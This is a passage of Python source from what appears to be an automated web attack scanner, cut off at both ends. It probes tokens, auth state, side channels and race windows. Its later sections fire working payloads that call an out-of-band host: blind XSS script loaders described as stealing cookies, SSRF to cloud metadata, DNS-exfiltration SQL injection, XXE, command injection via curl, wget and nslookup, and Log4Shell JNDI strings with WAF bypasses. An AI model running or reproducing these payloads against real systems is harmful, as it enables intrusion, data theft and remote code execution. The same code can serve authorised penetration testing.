                r = _S.get(target, timeout=_TIMEOUT_SHORT)
                # Collect Set-Cookie tokens
                for cookie in r.cookies:
                    tokens_collected[f"cookie:{cookie.name}@{target}"].append(cookie.value)
                # Collect CSRF tokens from response
                for m in re.finditer(r'name=["\']csrf[^"\']*["\'][^>]*value=["\']([^"\']+)["\']', r.text, re.I):
                    tokens_collected[f"csrf@{target}"].append(m.group(1))
                # Collect any token-like values in JSON
                for m in re.finditer(r'"(?:token|session_id|api_key|nonce|csrf)":\s*"([^"]{8,})"', r.text):
                    tokens_collected[f"json_token@{target}"].append(m.group(1))
            except Exception:
                break

    for source, tokens in tokens_collected.items():
        if len(tokens) < 10:
            continue

        # Calculate Shannon entropy of the token character distribution
        all_chars = "".join(tokens)
        char_freq = defaultdict(int)
        for c in all_chars:
            char_freq[c] += 1
        total = len(all_chars)
        entropy = -sum((count/total) * math.log2(count/total) for count in char_freq.values())

        # Expected entropy for a good random token
        charset_size = len(char_freq)
        max_entropy = math.log2(charset_size) if charset_size > 1 else 0
        avg_token_len = sum(len(t) for t in tokens) / len(tokens)
        total_bits = entropy * avg_token_len

        # Check for sequential/predictable patterns
        is_sequential = False
        if all(t.isdigit() for t in tokens):
            nums = [int(t) for t in tokens]
            diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
            if len(set(diffs)) <= 2:  # Constant or near-constant increment
                is_sequential = True

        # Check for timestamp-based tokens
        is_timestamp = False
        if all(len(t) >= 10 and t[:10].isdigit() for t in tokens):
            is_timestamp = True

        # Flag weak tokens
        if is_sequential:
            findings.append({
                "type": f"Sequential Token — Predictable ({source.split('@')[0]})",
                "severity": "critical",
                "url": source.split("@")[1] if "@" in source else web_targets[0],
                "detail": f"Token is sequential (increment pattern). {len(tokens)} samples collected. Trivially predictable.",
                "template": "apex-entropy-sequential",
            })
        elif is_timestamp:
            findings.append({
                "type": f"Timestamp-Based Token ({source.split('@')[0]})",
                "severity": "high",
                "url": source.split("@")[1] if "@" in source else web_targets[0],
                "detail": f"Token appears timestamp-based. Predictable within time window. Entropy: {total_bits:.1f} effective bits.",
                "template": "apex-entropy-timestamp",
            })
        elif total_bits < 32:  # Less than 32 bits of entropy = brute-forceable
            findings.append({
                "type": f"Weak Token Entropy ({source.split('@')[0]})",
                "severity": "high",
                "url": source.split("@")[1] if "@" in source else web_targets[0],
                "detail": f"Token has only {total_bits:.1f} bits of entropy (need ≥64). Charset: {charset_size} chars, avg length: {avg_token_len:.0f}. Brute-forceable in {2**total_bits:.0f} attempts.",
                "template": "apex-entropy-weak",
            })
    return findings


def scan_state_machine_inference(crawl_data, web_targets):
    """State machine inference — discover hidden application states and illegal transitions.
    
    Technique: Model the app as a finite state machine by observing how responses change
    based on request sequences. Find transitions that shouldn't be possible
    (e.g., going from 'unauthenticated' to 'admin' without login)."""
    findings = []

    for target in web_targets[:3]:
        base = target.rstrip("/")
        
        # Define state-probing requests
        state_probes = [
            ("unauthenticated", "GET", f"{base}/api/me", {}),
            ("unauthenticated", "GET", f"{base}/api/user", {}),
            ("unauthenticated", "GET", f"{base}/dashboard", {}),
            ("unauthenticated", "GET", f"{base}/admin", {}),
        ]

        # State transitions to test (should be impossible without auth)
        illegal_transitions = [
            # Direct state jump: unauth → admin action
            ("DELETE", f"{base}/api/users/1", {}, "admin delete without auth"),
            ("PUT", f"{base}/api/users/1", {"role": "admin"}, "role elevation without auth"),
            ("POST", f"{base}/api/admin/settings", {"debug": True}, "admin settings without auth"),
            ("PATCH", f"{base}/api/config", {"maintenance": False}, "config change without auth"),
            # State confusion: send conflicting state indicators
            ("GET", f"{base}/api/me", {"Cookie": "role=admin; is_admin=1"}, "cookie state injection"),
            ("GET", f"{base}/admin", {"X-User-Role": "admin"}, "header state injection"),
        ]

        for method, url, data_or_headers, desc in illegal_transitions:
            try:
                if isinstance(data_or_headers, dict) and any(k in data_or_headers for k in ["Cookie", "X-User-Role"]):
                    r = _S.request(method, url, headers=data_or_headers, timeout=_TIMEOUT_SHORT)
                else:
                    r = _S.request(method, url, json=data_or_headers if data_or_headers else None, timeout=_TIMEOUT_SHORT)

                if r.status_code == 200 and len(r.text) > 100:
                    if "error" not in r.text.lower()[:100] and "unauthorized" not in r.text.lower():
                        findings.append({
                            "type": f"Illegal State Transition — {desc}",
                            "severity": "critical",
                            "url": url,
                            "detail": f"{method} {url} succeeded without proper auth state. Application state machine has illegal transition.",
                            "template": "apex-state-machine",
                        })
            except Exception:
                continue
    return findings


def scan_information_leakage_differential(crawl_data, web_targets):
    """Information leakage via differential analysis — detect side channels.
    
    Technique: Send requests that differ by one bit of information and measure
    if the response leaks that bit. This is the theoretical foundation of all
    side-channel attacks (timing, size, error messages)."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")

        # Test 1: User existence oracle via response differentiation
        for path in ["/api/login", "/login", "/api/auth", "/api/forgot-password"]:
            url = f"{base}{path}"
            try:
                # Request with likely-valid email format
                r1 = _S.post(url, json={"email": "admin@" + urllib.parse.urlparse(target).hostname,
                                         "password": "x"}, timeout=_TIMEOUT)
                # Request with definitely-invalid email
                r2 = _S.post(url, json={"email": "nonexistent_xyzzy_99@invalid-domain-apex.com",
                                         "password": "x"}, timeout=_TIMEOUT)

                if r1.status_code == r2.status_code:
                    # Same status but different response = information leak
                    diff_size = abs(len(r1.text) - len(r2.text))
                    diff_content = r1.text != r2.text

                    if diff_content and diff_size > 5:
                        # Analyze what's different
                        if any(x in r1.text.lower() for x in ["incorrect password", "wrong password",
                                                                "invalid password"]):
                            findings.append({
                                "type": "User Enumeration via Error Message Differential",
                                "severity": "medium",
                                "url": url,
                                "detail": f"Different error for valid vs invalid user. Response diff: {diff_size} bytes. Leaks user existence.",
                                "template": "apex-info-leak-user-enum",
                            })
                        elif diff_size > 50:
                            findings.append({
                                "type": "Information Leakage via Response Differential",
                                "severity": "medium",
                                "url": url,
                                "detail": f"Response differs by {diff_size} bytes for valid vs invalid input. Side channel detected.",
                                "template": "apex-info-leak-differential",
                            })
            except Exception:
                continue

        # Test 2: Permission oracle — detect if resource exists even when 403
        for path in ["/api/users/", "/api/accounts/", "/api/orders/"]:
            url_exists = f"{base}{path}1"
            url_not_exists = f"{base}{path}99999999"
            try:
                r1 = _S.get(url_exists, timeout=_TIMEOUT_SHORT)
                r2 = _S.get(url_not_exists, timeout=_TIMEOUT_SHORT)
                # If both are 403 but responses differ, we can enumerate resources
                if r1.status_code == 403 and r2.status_code in (403, 404):
                    if r1.status_code != r2.status_code or len(r1.text) != len(r2.text):
                        findings.append({
                            "type": "Resource Enumeration via 403 Differential",
                            "severity": "medium",
                            "url": url_exists,
                            "detail": f"403 response differs for existing vs non-existing resource. Can enumerate valid IDs.",
                            "template": "apex-info-leak-403-enum",
                        })
            except Exception:
                continue
    return findings


def scan_race_window_exploitation(crawl_data, web_targets):
    """Race condition window exploitation — find the exact timing window for TOCTOU bugs.
    
    Time-of-check to time-of-use: the gap between when a condition is verified
    and when it's acted upon. We find this gap and exploit it."""
    findings = []
    from concurrent.futures import ThreadPoolExecutor, as_completed

    # Find state-changing endpoints
    state_endpoints = []
    for url in list(crawl_data.get("params", {}).keys())[:30]:
        lower = url.lower()
        if any(x in lower for x in ["transfer", "send", "withdraw", "redeem",
                                      "apply", "claim", "use", "activate",
                                      "delete", "update", "change", "modify"]):
            state_endpoints.append(url)

    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/transfer", "/api/redeem", "/api/apply-coupon",
                     "/api/withdraw", "/api/claim", "/api/activate"]:
            state_endpoints.append(f"{base}{path}")

    for url in list(set(state_endpoints))[:8]:
        try:
            # Send N requests with increasing parallelism to find the race window
            for concurrency in [2, 5, 10, 20]:
                results = []

                def _race():
                    try:
                        return _S.post(url, json={"amount": 1}, timeout=_TIMEOUT)
                    except Exception:
                        return None

                with ThreadPoolExecutor(max_workers=concurrency) as pool:
                    futs = [pool.submit(_race) for _ in range(concurrency)]
                    for f in as_completed(futs):
                        r = f.result()
                        if r and r.status_code in (200, 201, 204):
                            results.append(r)

                # If more than 1 succeeded at higher concurrency but not at lower
                if len(results) > 1:
                    findings.append({
                        "type": f"Race Condition Window (concurrency={concurrency})",
                        "severity": "critical",
                        "url": url,
                        "detail": f"{len(results)}/{concurrency} parallel requests succeeded. TOCTOU window exploitable at {concurrency} concurrent requests.",
                        "template": "apex-race-window",
                    })
                    break
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# Batch 32 — Absolute theoretical limits of black-box testing
# ---------------------------------------------------------------------------

def scan_compression_oracle(crawl_data, web_targets):
    """BREACH/CRIME-style compression oracle — extract secrets byte-by-byte.
    
    Theory: If response is compressed (gzip) and reflects user input alongside a secret,
    we can guess the secret one character at a time. When our guess matches part of the
    secret, compression shrinks the response. This is an information-theoretic side channel
    that leaks secrets through response SIZE alone.
    
    This is provably undetectable by the server and works against any compressed response
    that contains both attacker-controlled input and a secret value."""
    findings = []

    for url, params in list(crawl_data.get("params", {}).items())[:15]:
        for p in params[:2]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            # Check if response is compressed and reflects our input
            qs[p] = ["APEX_REFLECT_TEST"]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            try:
                r = _S.get(test_url, timeout=_TIMEOUT,
                           headers={"Accept-Encoding": "gzip, deflate"})
                if "APEX_REFLECT_TEST" not in r.text:
                    continue
                if "gzip" not in r.headers.get("Content-Encoding", ""):
                    continue

                # Response is compressed AND reflects input — oracle exists
                # Try to detect a CSRF token or session value nearby
                # Measure baseline size
                qs[p] = ["a"]
                base_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r_base = _S.get(base_url, timeout=_TIMEOUT,
                                headers={"Accept-Encoding": "gzip, deflate"})
                base_size = len(r_base.content)

                # Try common secret prefixes
                prefixes = ["csrf", "token", "session", "secret", "api_key", "Bearer"]
                for prefix in prefixes:
                    qs[p] = [prefix]
                    prefix_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r_prefix = _S.get(prefix_url, timeout=_TIMEOUT,
                                      headers={"Accept-Encoding": "gzip, deflate"})
                    # If compressed size is SMALLER with the prefix, it matched something
                    if len(r_prefix.content) < base_size - 2:
                        findings.append({
                            "type": "Compression Oracle (BREACH)",
                            "severity": "high",
                            "url": url,
                            "detail": f"Param '{p}' reflected in gzip response alongside secrets. Prefix '{prefix}' compresses better ({len(r_prefix.content)}B vs {base_size}B). Secret extractable byte-by-byte.",
                            "template": "apex-compression-oracle",
                        })
                        break
            except Exception:
                continue
    return findings


def scan_cache_timing_oracle(web_targets):
    """Cache timing oracle — determine if a resource exists by measuring cache behavior.
    
    Theory: Cached responses are faster than uncached. By measuring response time
    for resources we can't access (403), we can determine if they EXIST in cache,
    which leaks information about other users' activity.
    
    This is a covert channel that leaks information through TIME alone."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")
        # Test paths that might be cached per-user
        test_paths = ["/api/user/1/profile", "/api/user/2/profile",
                      "/user/admin", "/dashboard", "/api/orders/1"]

        timing_data = {}
        for path in test_paths:
            url = f"{base}{path}"
            times = []
            try:
                for _ in range(5):
                    t0 = time.time()
                    r = _S.get(url, timeout=_TIMEOUT_SHORT)
                    elapsed = time.time() - t0
                    times.append(elapsed)
                avg = sum(times) / len(times)
                std = (sum((t - avg) ** 2 for t in times) / len(times)) ** 0.5
                timing_data[path] = {"avg": avg, "std": std, "status": r.status_code, "times": times}
            except Exception:
                continue

        # Analyze: if some 403 paths are consistently faster, they're cached (= exist)
        forbidden = {p: d for p, d in timing_data.items() if d["status"] == 403}
        if len(forbidden) >= 2:
            times_list = [(p, d["avg"]) for p, d in forbidden.items()]
            times_list.sort(key=lambda x: x[1])
            fastest = times_list[0]
            slowest = times_list[-1]
            if slowest[1] > fastest[1] * 1.5 and fastest[1] < 0.5:
                findings.append({
                    "type": "Cache Timing Oracle — Resource Existence Leak",
                    "severity": "medium",
                    "url": f"{base}{fastest[0]}",
                    "detail": f"403 response for '{fastest[0]}' is {fastest[1]*1000:.0f}ms (cached?) vs '{slowest[0]}' at {slowest[1]*1000:.0f}ms. Leaks resource existence.",
                    "template": "apex-cache-timing-oracle",
                })
    return findings


def scan_polynomial_fingerprint(crawl_data):
    """Polynomial response fingerprinting — detect hidden parameters by response polynomial.
    
    Theory: Model the response as a polynomial function of inputs. If adding a parameter
    changes the polynomial's degree or coefficients, that parameter is processed server-side
    even if not documented. This finds parameters that produce NO visible change in content
    but alter internal state (blind parameters)."""
    findings = []

    for url, params in list(crawl_data.get("params", {}).items())[:10]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)

        # Get baseline response characteristics (our "polynomial")
        try:
            r_base = _S.get(url, timeout=_TIMEOUT)
            base_fingerprint = {
                "size": len(r_base.content),
                "headers_count": len(r_base.headers),
                "status": r_base.status_code,
                "set_cookies": len(r_base.cookies),
                "time_ms": 0,  # filled below
            }
            # Measure timing precisely
            times = []
            for _ in range(3):
                t0 = time.time()
                _S.get(url, timeout=_TIMEOUT)
                times.append((time.time() - t0) * 1000)
            base_fingerprint["time_ms"] = sum(times) / len(times)
        except Exception:
            continue

        # Test hidden params that might alter server behavior without visible response change
        blind_params = ["debug", "verbose", "trace", "log", "profile", "timing",
                        "cache", "nocache", "refresh", "force", "bypass", "internal",
                        "admin", "test", "dev", "raw", "full", "all", "unsafe",
                        "no_auth", "skip_validation", "override", "sudo"]

        for bp in blind_params:
            test_url = f"{url}{'&' if '?' in url else '?'}{bp}=1"
            try:
                times = []
                sizes = []
                for _ in range(3):
                    t0 = time.time()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    times.append((time.time() - t0) * 1000)
                    sizes.append(len(r.content))

                avg_time = sum(times) / len(times)
                avg_size = sum(sizes) / len(sizes)

                # Detect changes in the "polynomial" — any dimension changing means param is processed
                changes = []
                if abs(avg_time - base_fingerprint["time_ms"]) > base_fingerprint["time_ms"] * 0.3:
                    changes.append(f"timing: {base_fingerprint['time_ms']:.0f}ms → {avg_time:.0f}ms")
                if abs(avg_size - base_fingerprint["size"]) > 10:
                    changes.append(f"size: {base_fingerprint['size']} → {avg_size:.0f}")
                if r.status_code != base_fingerprint["status"]:
                    changes.append(f"status: {base_fingerprint['status']} → {r.status_code}")
                if len(r.cookies) != base_fingerprint["set_cookies"]:
                    changes.append(f"cookies: {base_fingerprint['set_cookies']} → {len(r.cookies)}")
                if len(r.headers) != base_fingerprint["headers_count"]:
                    changes.append(f"headers: {base_fingerprint['headers_count']} → {len(r.headers)}")

                if changes:
                    severity = "high" if bp in ("admin", "sudo", "no_auth", "bypass", "override") else "medium"
                    findings.append({
                        "type": f"Blind Parameter Accepted: {bp}",
                        "severity": severity,
                        "url": test_url,
                        "detail": f"Hidden param '{bp}=1' alters server behavior: {'; '.join(changes)}",
                        "template": "apex-blind-param-poly",
                    })
            except Exception:
                continue
    return findings


def scan_markov_prediction(crawl_data, web_targets):
    """Markov chain prediction — predict next valid tokens/IDs from observed sequences.
    
    Theory: If tokens/IDs follow a pattern (even a complex one), we can model it as a
    Markov chain and predict future values. This breaks any PRNG that isn't
    cryptographically secure."""
    findings = []

    # Collect sequential data from paginated endpoints
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/users", "/api/orders", "/api/transactions", "/api/messages"]:
            url = f"{base}{path}"
            try:
                r = _S.get(f"{url}?limit=20&sort=id", timeout=_TIMEOUT)
                if r.status_code != 200:
                    continue
                data = r.json()
                items = data if isinstance(data, list) else data.get("results", data.get("data", []))
                if not isinstance(items, list) or len(items) < 5:
                    continue

                # Extract IDs
                ids = []
                for item in items:
                    if isinstance(item, dict):
                        for key in ["id", "_id", "uuid", "token"]:
                            if key in item:
                                ids.append(str(item[key]))
                                break

                if len(ids) < 5:
                    continue

                # Analyze predictability
                if all(i.isdigit() for i in ids):
                    nums = [int(i) for i in ids]
                    diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                    # Constant increment = trivially predictable
                    if len(set(diffs)) == 1:
                        next_id = nums[-1] + diffs[0]
                        # Verify prediction
                        r2 = _S.get(f"{url}/{next_id}", timeout=_TIMEOUT_SHORT)
                        if r2.status_code == 200:
                            findings.append({
                                "type": "Predictable Sequential IDs (Markov Order-1)",
                                "severity": "high",
                                "url": f"{url}/{next_id}",
                                "detail": f"IDs increment by {diffs[0]}. Predicted next: {next_id}. Confirmed accessible. Full enumeration trivial.",
                                "template": "apex-markov-sequential",
                            })
                    # Linear pattern with noise
                    elif max(diffs) - min(diffs) < 5:
                        avg_diff = sum(diffs) / len(diffs)
                        findings.append({
                            "type": "Near-Sequential IDs (Predictable Pattern)",
                            "severity": "medium",
                            "url": url,
                            "detail": f"IDs follow near-linear pattern (avg increment: {avg_diff:.1f}, variance: {max(diffs)-min(diffs)}). Enumerable with small search space.",
                            "template": "apex-markov-near-seq",
                        })
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 33 — OOB-enhanced attacks using the full exploitation platform
# ---------------------------------------------------------------------------

def scan_blind_xss_oob(crawl_data, oob_server):
    """Inject blind XSS payloads that phone home to OOB server with stolen data."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    uid_base = f"bxss_{int(time.time())}"

    # Blind XSS payload — executes on admin panels, support tickets, logs
    payload = f'"><script src=http://{oob}/payload/{uid_base}></script>'
    payload_img = f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'http://{oob}/payload/{uid_base}\';document.head.appendChild(s)">'

    # Inject into every text field that might be viewed by admins
    inject_targets = ["name", "username", "email", "subject", "message", "comment",
                      "feedback", "title", "description", "bio", "company",
                      "address", "phone", "url", "website", "referrer",
                      "user-agent", "x-forwarded-for"]

    injected = 0
    for form in crawl_data.get("forms", [])[:15]:
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        data = {}
        for inp in inputs:
            name = inp.get("name", "")
            if any(x in name.lower() for x in inject_targets):
                data[name] = payload
            else:
                data[name] = inp.get("value", "test")
        if data:
            try:
                _S.post(action, data=data, timeout=_TIMEOUT)
                injected += 1
            except Exception:
                pass

    # Also inject via headers (User-Agent, Referer — logged by many apps)
    for target in list(set(p["url"] for p in crawl_data.get("pages", [])))[:10]:
        try:
            _S.get(target, headers={
                "User-Agent": payload_img,
                "Referer": f"http://{oob}/{uid_base}",
                "X-Forwarded-For": payload,
            }, timeout=_TIMEOUT_SHORT)
            injected += 1
        except Exception:
            pass

    if injected > 0:
        # Check if any callbacks came in (give it a moment)
        time.sleep(2)
        try:
            import requests
            r = requests.get(f"http://{oob}/poll?uid={uid_base}", timeout=3)
            data = r.json()
            if data.get("hit"):
                findings.append({
                    "type": "Blind XSS (OOB Confirmed — Data Stolen)",
                    "severity": "critical",
                    "url": f"http://{oob}/poll?uid={uid_base}",
                    "detail": f"Blind XSS triggered! {data.get('count', 1)} callbacks received. Cookies/DOM/localStorage exfiltrated.",
                    "template": "apex-blind-xss-oob",
                })
        except Exception:
            pass

        # Even without immediate callback, report the injection for later monitoring
        findings.append({
            "type": f"Blind XSS Injected ({injected} endpoints)",
            "severity": "medium",
            "url": f"http://{oob}/poll?uid={uid_base}",
            "detail": f"Payload injected into {injected} endpoints. Monitor http://{oob}/poll?uid={uid_base} for callbacks.",
            "template": "apex-blind-xss-pending",
        })
    return findings


def scan_ssrf_via_oob_redirect(crawl_data, oob_server):
    """SSRF via OOB redirect — use our server as a redirector to bypass URL allowlists."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    # Our redirect URL that bounces to internal targets
    internal_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
    ]

    ssrf_params = ["url", "uri", "src", "href", "link", "dest", "redirect",
                   "path", "file", "fetch", "load", "proxy", "target", "callback"]

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params:
            if not any(x in p.lower() for x in ssrf_params):
                continue
            for internal in internal_targets:
                # Use our OOB server as a redirector to bypass allowlists
                redirect_url = f"http://{oob}/redirect?url={urllib.parse.quote(internal)}"
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [redirect_url]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(x in r.text for x in ["ami-id", "instance-id", "redis_version",
                                                   "cluster_name", "meta-data"]):
                        findings.append({
                            "type": "SSRF via OOB Redirect (Allowlist Bypass)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"SSRF via redirect through {oob}. Param '{p}' fetches our redirector → {internal}",
                            "template": "apex-ssrf-oob-redirect",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_dns_exfil_sqli(crawl_data, oob_server):
    """Blind SQLi data exfiltration via DNS — extract data through DNS queries.
    
    Technique: LOAD_FILE() or UTL_HTTP on Oracle to make DNS query containing data.
    The data appears as a subdomain in our DNS server logs."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    uid = f"sqldns_{int(time.time())}"

    # DNS exfil payloads for different databases
    dns_payloads = [
        # MySQL
        f"' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{uid}.dns.{oob}\\\\a'))-- -",
        # MSSQL
        f"'; EXEC master..xp_dirtree '\\\\'+@@version+'.{uid}.dns.{oob}\\a'-- -",
        # PostgreSQL
        f"'; COPY (SELECT version()) TO PROGRAM 'nslookup '||version()||'.{uid}.dns.{oob}'-- -",
        # Oracle
        f"' AND UTL_HTTP.REQUEST('http://'||user||'.{uid}.dns.{oob}')='1'-- -",
    ]

    for url, params in list(crawl_data.get("params", {}).items())[:15]:
        for p in params[:3]:
            for payload in dns_payloads:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    _S.get(test_url, timeout=_TIMEOUT)
                except Exception:
                    pass

    # Wait for DNS callbacks
    time.sleep(3)
    try:
        import requests
        r = requests.get(f"http://{oob}/dns", timeout=3)
        dns_data = r.json()
        if uid in str(dns_data):
            # Extract the exfiltrated data from DNS queries
            for query_uid, queries in dns_data.items():
                if uid in query_uid or any(uid in str(q) for q in queries):
                    exfil = [q.get("data", q.get("domain", "")) for q in queries]
                    findings.append({
                        "type": "Blind SQLi — Data Exfiltrated via DNS",
                        "severity": "critical",
                        "url": url,
                        "detail": f"SQL injection confirmed via DNS exfil. Extracted: {exfil[:3]}",
                        "template": "apex-sqli-dns-exfil",
                    })
    except Exception:
        pass
    return findings


# ---------------------------------------------------------------------------
# Batch 34 — OOB-powered XXE, SSRF port scan, blind RCE, log4shell deep
# ---------------------------------------------------------------------------

def scan_xxe_oob_exfil(crawl_data, oob_server):
    """XXE with OOB data exfiltration — extract files via out-of-band HTTP/DNS."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    uid = f"xxe_{int(time.time())}"

    # XXE payloads that exfiltrate data to our OOB server
    xxe_payloads = [
        # Standard XXE OOB
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob}/{uid}">]><root>&xxe;</root>""",
        # Parameter entity OOB (bypasses many filters)
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/{uid}">%xxe;]><root>test</root>""",
        # XXE via SVG
        f"""<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{oob}/{uid}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>""",
        # XXE via SOAP
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob}/{uid}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>""",
    ]

    # Find XML-accepting endpoints
    xml_endpoints = []
    for url, params in crawl_data.get("params", {}).items():
        xml_endpoints.append(url.split("?")[0])
    for form in crawl_data.get("forms", []):
        if form.get("action"):
            xml_endpoints.append(form["action"])

    for url in list(set(xml_endpoints))[:15]:
        for payload in xxe_payloads:
            try:
                # Try as XML body
                r = _S.post(url, data=payload,
                            headers={"Content-Type": "application/xml"}, timeout=_TIMEOUT)
                # Try as text/xml
                _S.post(url, data=payload,
                        headers={"Content-Type": "text/xml"}, timeout=_TIMEOUT)
                # Try as SOAP
                _S.post(url, data=payload,
                        headers={"Content-Type": "application/soap+xml"}, timeout=_TIMEOUT)
            except Exception:
                pass

    # Check for OOB callbacks
    time.sleep(3)
    try:
        import requests
        r = requests.get(f"http://{oob}/poll?uid={uid}", timeout=3)
        if r.json().get("hit"):
            findings.append({
                "type": "XXE — OOB Confirmed (File Read Possible)",
                "severity": "critical",
                "url": xml_endpoints[0] if xml_endpoints else "multiple",
                "detail": f"XXE triggered OOB callback to {oob}. Server parses external entities. File exfiltration possible.",
                "template": "apex-xxe-oob",
            })
    except Exception:
        pass
    return findings


def scan_ssrf_port_scan_oob(crawl_data, oob_server, web_targets):
    """Use confirmed SSRF to port-scan internal network via response timing."""
    findings = []
    if not oob_server:
        return findings

    # Find SSRF-able params
    ssrf_params = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["url", "uri", "src", "href", "link",
                                              "dest", "fetch", "load", "proxy"]):
                ssrf_params.append((url, p))

    if not ssrf_params:
        return findings

    url, param = ssrf_params[0]
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)

    # Scan common internal ports via timing
    ports_to_scan = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017,
                     11211, 5672, 15672, 2379, 8500, 9090, 3000, 4000, 5000]

    open_ports = []
    for port in ports_to_scan:
        qs[param] = [f"http://127.0.0.1:{port}/"]
        test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        try:
            t0 = time.time()
            r = _S.get(test_url, timeout=5)
            elapsed = time.time() - t0
            # Open port: fast response or different content
            # Closed port: timeout or connection refused (slower)
            if elapsed < 3 and r.status_code == 200 and len(r.text) > 0:
                open_ports.append(port)
        except Exception:
            pass

    if open_ports:
        findings.append({
            "type": "SSRF Internal Port Scan — Open Ports Found",
            "severity": "high",
            "url": url,
            "detail": f"Internal ports open via SSRF: {open_ports}. Param: '{param}'",
            "template": "apex-ssrf-portscan",
        })
    return findings


def scan_blind_rce_oob(crawl_data, oob_server):
    """Blind RCE confirmation via OOB — inject commands that call back to our server."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    uid = f"rce_{int(time.time())}"

    # Command injection payloads that trigger OOB callback
    rce_payloads = [
        f";curl http://{oob}/{uid}",
        f"|curl http://{oob}/{uid}",
        f"`curl http://{oob}/{uid}`",
        f"$(curl http://{oob}/{uid})",
        f";wget http://{oob}/{uid}",
        f"|wget http://{oob}/{uid}",
        f";nslookup {uid}.dns.{oob}",
        f"|nslookup {uid}.dns.{oob}",
        f"$(nslookup {uid}.dns.{oob})",
        f"`nslookup {uid}.dns.{oob}`",
        f";ping -c1 {uid}.dns.{oob}",
        # Windows
        f"& nslookup {uid}.dns.{oob}",
        f"| curl http://{oob}/{uid}",
    ]

    # Inject into all params
    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            for payload in rce_payloads[:5]:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    _S.get(test_url, timeout=_TIMEOUT)
                except Exception:
                    pass

    # Also inject via headers
    for page in crawl_data.get("pages", [])[:5]:
        for payload in rce_payloads[:3]:
            try:
                _S.get(page["url"], headers={
                    "User-Agent": payload,
                    "X-Forwarded-For": payload,
                    "Referer": payload,
                }, timeout=_TIMEOUT_SHORT)
            except Exception:
                pass

    # Check for callbacks
    time.sleep(4)
    try:
        import requests
        r = requests.get(f"http://{oob}/poll?uid={uid}", timeout=3)
        if r.json().get("hit"):
            hit_data = r.json().get("data", [{}])
            source_ip = hit_data[0].get("ip", "unknown") if hit_data else "unknown"
            findings.append({
                "type": "Remote Code Execution (OOB Confirmed)",
                "severity": "critical",
                "url": "multiple injection points",
                "detail": f"RCE confirmed! Server executed command and called back to {oob}. Source IP: {source_ip}",
                "template": "apex-rce-oob",
            })
        # Also check DNS
        r2 = requests.get(f"http://{oob}/dns", timeout=3)
        dns_data = r2.json()
        if uid in str(dns_data):
            findings.append({
                "type": "Remote Code Execution (DNS Callback Confirmed)",
                "severity": "critical",
                "url": "multiple injection points",
                "detail": f"RCE confirmed via DNS callback. nslookup/ping executed on server.",
                "template": "apex-rce-dns-oob",
            })
    except Exception:
        pass
    return findings


def scan_log4shell_oob(web_targets, oob_server):
    """Log4Shell (CVE-2021-44228) with OOB confirmation via JNDI/LDAP/DNS."""
    findings = []
    if not oob_server or not hasattr(oob_server, "domain"):
        return findings

    oob = oob_server.domain
    uid = f"log4j_{int(time.time())}"

    # Log4Shell payloads with various bypass techniques
    log4j_payloads = [
        f"${{jndi:ldap://{oob}/{uid}}}",
        f"${{jndi:dns://{uid}.dns.{oob}}}",
        f"${{jndi:rmi://{oob}/{uid}}}",
        # Bypass WAF
        f"${{${{lower:j}}ndi:ldap://{oob}/{uid}}}",
